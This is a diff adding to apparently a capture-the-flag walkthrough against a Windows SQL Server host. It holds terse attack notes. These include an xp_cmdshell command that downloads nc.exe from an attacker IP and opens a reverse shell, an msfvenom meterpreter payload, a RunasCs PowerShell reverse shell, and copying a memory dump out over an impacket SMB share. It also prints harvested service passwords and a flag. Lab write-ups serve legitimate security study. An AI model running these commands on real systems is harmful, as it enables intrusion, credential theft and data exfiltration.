@@ -101,12 +101,72 @@ EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 END;
 
+now we need to make the server run nc
+EXEC xp_cmdshell 'dir C:\Users\Public';
+
+EXEC xp_cmdshell 'powershell -noprofile -Command "Invoke-WebRequest http://10.10.15.3:8888/nc.exe -OutFile C:\Users\Public\nc.exe" & C:\Users\Public\nc.exe 10.10.15.3 4444 -e powershell'
+
+in C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU> more sql-Configuration.INI we found credentials:
+
+ACTION="Install"
+QUIET="True"
+FEATURES=SQL
+INSTANCENAME="SQLEXPRESS"
+INSTANCEID="SQLEXPRESS"
+RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
+AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
+AGTSVCSTARTUPTYPE="Manual"
+COMMFABRICPORT="0"
+COMMFABRICNETWORKLEVEL=""0"
+COMMFABRICENCRYPTION="0"
+MATRIXCMBRICKCOMMPORT="0"
+SQLSVCSTARTUPTYPE="Automatic"
+FILESTREAMLEVEL="0"
+ENABLERANU="False" 
+SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
+SQLSVCACCOUNT="FREELANCER\sql_svc"
+SQLSVCPASSWORD="IL0v3ErenY3ager"
+SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
+SECURITYMODE="SQL"
+SAPWD="t3mp0r@ryS@PWD"
+ADDCURRENTUSERASSQLADMIN="False"
+TCPENABLED="1"
+NPENABLED="1"
+BROWSERSVCSTARTUPTYPE="Automatic"
+IAcceptSQLServerLicenseTerms=True
+
+now we can runascs with credentials to trigger shell with new permissions
+
+let make payload with msfvenom:
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4445 -f exe -o rv45.exe
+
+lets download it and run it
+
+doesnt work
+
+lets run powershell reverse shell 
+
 ./runascs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.14.199:4446
+
+got it,now we are reelancer\mikasaackerman
+
+going to C:\users\mikasaAckerman\Desktop
+
+userflag.txt:
+
+2f1586fd5b8415aee3f047eb34fb1d04
+
+in this Directory we have MEMORY.7z and mail.txt
+
+lets try to download the MEMORY file with smbserver:
 
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username test -password test test .
 
-net use \\10.10.14.199\test /user:test test
+net use <Some Drive Z: ,M: ,...>\\10.10.14.199\test /user:test test
 
-copy C:\Users\mikasaackerman\Desktop\MEMORY.7z
+copy MEMORY.7z \\10.10.14.199\dump\memory.7z
+
+
 
 
